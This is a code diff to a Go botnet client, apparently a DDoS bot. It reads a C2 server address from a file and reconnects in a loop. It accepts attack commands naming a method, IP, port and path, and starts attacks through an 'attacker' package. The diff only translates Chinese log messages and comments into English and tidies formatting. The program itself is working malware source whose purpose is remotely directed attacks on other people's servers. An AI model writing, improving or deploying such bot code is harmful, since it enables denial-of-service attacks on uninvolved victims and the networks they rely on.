@@ -11,35 +11,36 @@ import (
 	"strings"
 	"time"
 
-	"bot/attacker" 
+	"bot/attacker"
 )
+
 const (
-	c2File  = "./serverfile/c2.txt"
+	c2File     = "./serverfile/c2.txt"
 	retryPeriod = 10 * time.Second
 )
 
 func main() {
 	c2Addr := readC2Address()
-	
+
 	for {
 		conn, err := net.Dial("tcp", fmt.Sprintf("%s:80", c2Addr))
 		if err != nil {
-			log.Printf("连接C2失败: %v，%s后重试...", err, retryPeriod)
+			log.Printf("Failed to connect to C2: %v, retrying in %s...", err, retryPeriod)
 			time.Sleep(retryPeriod)
 			continue
 		}
 
-		log.Printf("成功连接至C2服务器: %s", c2Addr)
+		log.Printf("Successfully connected to C2 server: %s", c2Addr)
 		handleC2Connection(conn)
 		conn.Close()
-		log.Println("连接中断，开始重试...")
+		log.Println("Connection interrupted, retrying...")
 	}
 }
 
 func readC2Address() string {
 	data, err := os.ReadFile(c2File)
 	if err != nil {
-		log.Fatalf("读取C2地址文件失败: %v", err)
+		log.Fatalf("Failed to read C2 address file: %v", err)
 	}
 	return strings.TrimSpace(string(data))
 }
@@ -52,56 +53,56 @@ func handleC2Connection(conn net.Conn) {
 		command, err := reader.ReadString('\n')
 		if err != nil {
 			if err == io.EOF {
-				log.Println("C2服务器主动关闭连接")
+				log.Println("C2 server closed the connection")
 			} else {
-				log.Printf("读取指令错误: %v", err)
+				log.Printf("Error reading command: %v", err)
 			}
 			return
 		}
 
 		command = strings.TrimSpace(command)
-		log.Printf("收到指令: %s", command)
+		log.Printf("Received command: %s", command)
 
 		if method, ip, port, path, ok := parseCommand(command); ok {
 			go attacker.AttackInit(method, ip, port, path)
-			log.Printf("已启动攻击: [%s] %s:%d%s", method, ip, port, path)
+			log.Printf("Attack started: [%s] %s:%d%s", method, ip, port, path)
 		}
 	}
 }
 
 func parseCommand(cmd string) (string, string, int, string, bool) {
 	parts := strings.Fields(cmd)
-	
-	// 处理停止命令
+
+	// Handle stop command
 	if len(parts) > 0 && parts[0] == "STOP" {
 		return "STOP", "", 0, "", true
-	} 
-	
-	// 检查是否有足够的参数 (至少需要方法、IP和端口)
+	}
+
+	// Check if there are enough parameters (at least method, IP, and port)
 	if len(parts) < 3 {
-		log.Printf("无效指令格式: %s", cmd)
+		log.Printf("Invalid command format: %s", cmd)
 		return "", "", 0, "", false
 	}
 
-	// 验证IP地址
+	// Validate IP address
 	ip := net.ParseIP(parts[1])
 	if ip == nil {
-		log.Printf("非法IP地址: %s", parts[1])
+		log.Printf("Invalid IP address: %s", parts[1])
 		return "", "", 0, "", false
 	}
 
-	// 验证端口号
+	// Validate port number
 	port, err := strconv.Atoi(parts[2])
 	if err != nil || port < 1 || port > 65535 {
-		log.Printf("非法端口号: %s", parts[2])
+		log.Printf("Invalid port number: %s", parts[2])
 		return "", "", 0, "", false
 	}
 
-	// 处理可选的路径参数
+	// Handle optional path parameter
 	path := ""
 	if len(parts) > 3 {
 		path = parts[3]
-		// 确保路径以/开头
+		// Ensure the path starts with /
 		if !strings.HasPrefix(path, "/") {
 			path = "/" + path
 		}
